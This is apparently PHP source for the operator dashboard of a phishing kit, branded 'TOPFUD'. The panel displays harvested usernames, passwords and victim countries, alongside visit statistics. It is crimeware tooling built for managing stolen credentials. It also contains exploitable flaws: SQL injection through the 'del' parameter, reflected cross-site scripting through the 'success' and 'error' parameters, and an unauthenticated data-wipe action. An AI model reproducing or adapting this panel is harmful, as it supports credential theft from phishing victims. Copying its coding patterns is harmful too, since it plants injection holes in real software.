<?php
session_start();
$panel = true;
include('config.php');

if(isset($_GET['logout'])){
    unset($_SESSION['a']);
}

if(isset($_POST['pass']) && !empty($_POST['pass'])){
    if($pass == $_POST['pass']){
        $_SESSION["a"] = true;
        header("Location: index.php");
    }
}

if(isset($_GET['clear'])){
    unlink($database_name);
    header("Location: index.php?success= All Panel data cleared");
}

if(!isset($_SESSION["a"])){
    die ( '<center><form action="index.php" method="post">Password <input type="password" name="pass"><br><input type="submit" value="submit"></form></form></center>');
}


################# DB Basic Config ######################



$date = date('Y-m-d');

$visits = $db->query("SELECT * FROM visits");
$logs   = $db->query("SELECT * FROM logs");



if($visits->fetchArray()){
    $today      = $db->query("SELECT `visits` FROM visits WHERE `date` = '$date'")->fetchArray()['visits'];

    $yesdate    = date('Y-m-d', strtotime($date. ' - 1 days'));
    $yesterday  = $db->query("SELECT `visits` FROM visits WHERE `date` = '$yesdate'")->fetchArray()['visits'];

    $totalday   = $db->query("SELECT SUM(visits) as visits FROM visits")->fetchArray()['visits'];


}else{
    $today = 0;
    $yesterday = 0;
    $totalday = 0;
}

if(isset($_GET['del'])){
    $id = $_GET['del'];
    $query = "DELETE FROM logs WHERE id=$id";
    if( $db->query($query) ){
	    $msg = "Record is deleted successfully.";
	    header("Location : index.php?success=$msg");
    }else {
    	$msg = "Sorry, Record is not deleted.";
    	header("Location : index.php?error=$msg");
    }
}


$allDate = array();
$allVisits = array();
$getData = $db->query("SELECT * FROM visits");
while($row = $getData->fetchArray()) {
    array_push($allDate,$row['date']);
    array_push($allVisits,$row['visits']);
}




?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title> Admin Office </title>
	<link rel="icon" type="image/png" sizes="16x16" href="./assets/img/favicon.png">
    <!-- Bootstrap Core CSS -->
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <!-- chartist CSS -->
    <link href="./assets/css/chartist.min.css" rel="stylesheet">
    <link href="./assets/css/chartist-plugin-tooltip.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="./assets/css/style.css" rel="stylesheet">
    <!-- color CSS -->
    <link href="./assets/css/colors.css" id="theme" rel="stylesheet">
</head>

<body class="fix-header">
    <!-- ============================================================== -->
    <!-- Preloader -->
    <!-- ============================================================== -->
    <div class="preloader">
        <svg class="circular" viewBox="25 25 50 50">
            <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
        </svg>
    </div>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-static-top m-b-0">
            <div class="navbar-header">
                <div class="col-md-12">
					<div class="row">
						<h3 class="text-center" style="color:#fff;">Logs Panel - Created by TOPFUD<h3>
					</div>
				</div>
            </div>
        </nav>
        <div id="page-wrapper">
            <div class="container-fluid">
                <?php if(isset($_GET['success'])) echo '<div class="alert alert-success text-center">'. $_GET['success'].'</div>';
                      if(isset($_GET['error'])) echo '<div class="alert alert-danger text-center">'. $_GET['error'].'</div>';
                ?>

                <div class="row bg-title">
                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                        <h4 class="page-title">Dashboard</h4> </div>
                    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
                        <a href="#" onclick="clean();" style="padding: 5px 18px;" class="btn btn-danger pull-right m-l-20 hidden-xs hidden-sm waves-effect waves-light">Clean Panel</a>
                        <a href="./index.php?logout"  style="padding: 5px 18px;" class="btn btn-danger pull-right m-l-20 hidden-xs hidden-sm waves-effect waves-light">Logout</a>
                    </div>
                    <!-- /.col-lg-12 -->
                </div>
                <!-- .row -->
                <div class="row">
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Today Visits</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash"><img src="./assets/img/bar1.png"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-success"></i> <span class="counter text-success"><?= $today;?></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Yesterday Visits</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash"><img src="./assets/img/bar2.png"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-purple"></i> <span class="counter text-purple"><?= $yesterday;?></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">All Time Visits</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash"><img src="./assets/img/bar3.png"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-info"></i> <span class="counter text-info"><?= $totalday;?></span></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <!--/.row -->
                <!--row -->
                <!-- /.row -->
                <div class="row">
                    <div class="col-md-12 col-lg-12 col-sm-12 col-xs-12">
                        <div class="white-box">
                            <h3 class="box-title">Visitor</h3>
                            <div id="ct-visits" style="height: 405px;"></div>
                        </div>
                    </div>
                </div>
                <!-- ============================================================== -->
                <!-- table -->
                <!-- ============================================================== -->
                <div class="row">
                    <div class="col-md-12 col-lg-12 col-sm-12">
                        <div class="white-box">
                            <h3 class="box-title">Recent Logs</h3>
                            <div class="table-responsive">
                                <table class="table" id="dataTable">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Username</th>
                                            <th>Password</th>
                                            <th>Country</th>
                                            <th>DATE</th>
                                            <th>Type</th>
											                      <th>Delete</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php while($row = $logs->fetchArray()) {?>
                                        <tr>
                                            <td><?=$row['id'];?></td>
                                            <td class="txt-oflo"><?=$row['user'];?></td>
                                            <td><?=$row['pass'];?></td>
                                            <td><?=$row['country'];?></td>
                                            <td class="txt-oflo"><?=$row['date'];?></td>
                                            <td><span class="text-success"><?=$row['type'];?></span></td>
											<td><a href="index.php?del=<?=$row['id'];?>" class="btn btn-danger">Delete</a></td>
                                        </tr>
                                        <?php } ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- ============================================================== -->

            </div>
            <!-- /.container-fluid -->
            <footer class="footer text-center"> 2020 &copy; Logs Panel - Created by TOPFUD.com </footer>
        </div>
        <!-- ============================================================== -->
        <!-- End Page Content -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="./assets/js/jquery/jquery.min.js"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="./assets/js/bootstrap.min.js"></script>
    <!-- chartist chart -->
    <script src="./assets/js/chartist-js/chartist.min.js"></script>
    <script src="./assets/js/chartist-plugin-tooltip-master/chartist-plugin-tooltip.min.js"></script>
    <!-- Custom Theme JavaScript -->
    <script src="./assets/js/custom.js"></script>
	<script src="./assets/js/table/jquery.dataTables.min.js"></script>
	<script src="./assets/js/table/dataTables.bootstrap.min.js"></script>
	<script>
	$(document).ready(function() {
        $('#dataTable').DataTable();
    } );

    function clean(){
        if (window.confirm('Are you sure you want to delete all data of panel ?')){
            window.location="index.php?clear";
        }
    }

    getChart(<?= json_encode($allDate).','. json_encode($allVisits);?>)
	</script>
</body>

</html>
